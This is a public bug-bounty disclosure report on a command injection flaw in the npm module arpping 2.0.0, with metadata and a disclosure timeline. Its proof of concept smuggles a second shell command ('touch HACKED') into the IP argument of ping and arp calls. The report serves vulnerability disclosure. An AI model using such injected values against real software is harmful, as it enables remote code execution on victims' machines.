---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - stack/node
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2021-01-14
submitted: 2020-09-01T14:34:13.800Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "solov9ev"
source: "https://hackerone.com/reports/972220"
title: "[arpping] Remote Code Execution"
---
# [arpping] Remote Code Execution

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2021-01-14

- Report: [https://hackerone.com/reports/972220](https://hackerone.com/reports/972220)
- CWE: Code Injection
- Submitted: 2020-09-01T14:34:13.800Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report `RCE` in `arpping`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** arpping
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/arpping`

## Module Description

Discover and search for internet-connected devices (locally) using ping and arp

## Module Stats

[16] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection occurs when using commands: `ping`, `arp`

## Steps To Reproduce:

- Create and run the following POC index.js:

```javascript
const Arpping = require('arpping');

var arpping = new Arpping();
arpping.ping(["127.0.0.1;touch HACKED;"]); // arpping.arp(["127.0.0.1; touch HACKED;"]);
```
- The exploit worked and created the file - `HACKED`

{F972163}

## Patch

Check input before command

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `arpping` module via insecure command

## Timeline

- **Report Filed**
- **2020-12-10** @solov9ev: Hello! Any updates?
- **Report Resolved**
- **Agreed On Going Public**
- **2021-01-07** @solov9ev: Hi, @danielruf

Did you report a vulnerability in their library to the developer?
- **2021-01-07** @bbe8482aecd24374d13c5de15a0a6: @solov9ev yes I did and I invited them to this report. So far no reaction. This is why I requested disclosure.
- **Report Became Public**
